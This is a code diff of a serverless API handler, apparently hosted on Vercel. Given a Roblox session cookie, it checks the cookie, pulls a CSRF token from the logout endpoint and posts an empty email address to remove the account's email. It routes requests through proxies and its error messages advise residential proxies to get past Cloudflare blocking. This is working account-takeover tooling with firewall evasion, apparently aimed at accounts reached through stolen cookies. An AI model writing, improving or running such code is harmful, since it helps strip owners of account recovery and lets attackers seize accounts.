@@ -22,59 +22,56 @@ module.exports = async function handler(req, res) {
         'Referer': 'https://www.roblox.com/'
     };
 
+    // FUTURE PROOFING: If you add a PROXY_URL to Vercel env variables, it will use it automatically
+    const proxyUrl = process.env.PROXY_URL || null;
+    let agent = null;
+    if (proxyUrl) {
+        agent = new HttpsProxyAgent(proxyUrl);
+    }
+
     try {
-        // Fetch a fresh list of proxies
-        const proxyRes = await axios.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=2000&country=all&ssl=all&anonymity=all');
-        const proxies = proxyRes.data.split('\n').map(p => p.trim()).filter(p => p.length > 0);
+        // 1. Verify Cookie (Direct or via Proxy)
+        const authCheck = await axios.get('https://users.roblox.com/v1/users/authenticated', { 
+            headers: baseHeaders, httpsAgent: agent, proxy: false, timeout: 8000 
+        });
 
-        if (proxies.length === 0) {
-             return res.status(500).json({ success: false, message: 'Proxy API returned empty list.' });
-        }
-
-        // Only try 2 proxies to stay under Vercel's 10-second timeout
-        for (let i = 0; i < Math.min(proxies.length, 2); i++) {
-            const agent = new HttpsProxyAgent(`http://${proxies[i]}`);
-            
-            try {
-                // 800ms timeout so it fails instantly if the proxy is dead
-                const authCheck = await axios.get('https://users.roblox.com/v1/users/authenticated', { 
-                    headers: baseHeaders, httpsAgent: agent, proxy: false, timeout: 800 
-                });
-
-                if (authCheck.status === 200) {
-                    let csrfToken = '';
-                    try {
-                        await axios.post('https://auth.roblox.com/v2/logout', {}, { headers: baseHeaders, httpsAgent: agent, proxy: false, timeout: 800 });
-                    } catch (err) {
-                        if (err.response && err.response.headers['x-csrf-token']) {
-                            csrfToken = err.response.headers['x-csrf-token'];
-                        } else {
-                            continue; 
-                        }
-                    }
-
-                    try {
-                        await axios.post('https://accountsettings.roblox.com/v1/email', { emailAddress: "" }, { 
-                            headers: { ...baseHeaders, 'X-CSRF-TOKEN': csrfToken }, 
-                            httpsAgent: agent, proxy: false, timeout: 800 
-                        });
-                        
-                        return res.status(200).json({ success: true, data: { messages: ["Email successfully wiped."] } });
-                    } catch (err) {
-                        if (err.response && err.response.status === 403) {
-                            return res.status(403).json({ success: false, message: "Roblox requires a password to remove the email." });
-                        }
-                    }
-                }
-            } catch (err) {
-                continue; // Try next proxy immediately
+        // 2. Get CSRF
+        let csrfToken = '';
+        try {
+            await axios.post('https://auth.roblox.com/v2/logout', {}, { headers: baseHeaders, httpsAgent: agent, proxy: false, timeout: 8000 });
+        } catch (err) {
+            if (err.response && err.response.headers['x-csrf-token']) {
+                csrfToken = err.response.headers['x-csrf-token'];
+            } else {
+                return res.status(400).json({ success: false, message: 'Failed to grab CSRF token. Cookie may be dead.' });
             }
         }
 
-        // If we get here, both proxies failed or timed out
-        res.status(500).json({ success: false, message: 'Proxies blocked by Roblox firewall. Try again.' });
+        // 3. Wipe Email
+        try {
+            await axios.post('https://accountsettings.roblox.com/v1/email', { emailAddress: "" }, { 
+                headers: { ...baseHeaders, 'X-CSRF-TOKEN': csrfToken }, 
+                httpsAgent: agent, proxy: false, timeout: 8000 
+            });
+            
+            return res.status(200).json({ success: true, data: { messages: ["Email successfully wiped."] } });
+            
+        } catch (err) {
+            if (err.response && err.response.status === 403) {
+                return res.status(403).json({ success: false, message: "Blocked: Roblox requires the account password to remove the email." });
+            }
+            throw err;
+        }
 
     } catch (error) {
-        res.status(500).json({ success: false, message: 'Network Error: ' + error.message });
+        if (error.code === 'ECONNRESET' || error.code === 'ETIMEDOUT') {
+            return res.status(500).json({ success: false, message: 'Cloudflare blocked Vercel\'s IP. You need a residential proxy to bypass this.' });
+        }
+        
+        if (error.response && error.response.status === 401) {
+            return res.status(401).json({ success: false, message: 'Cookie is invalid or expired.' });
+        }
+
+        res.status(500).json({ success: false, message: `Error: ${error.message}` });
     }
 }
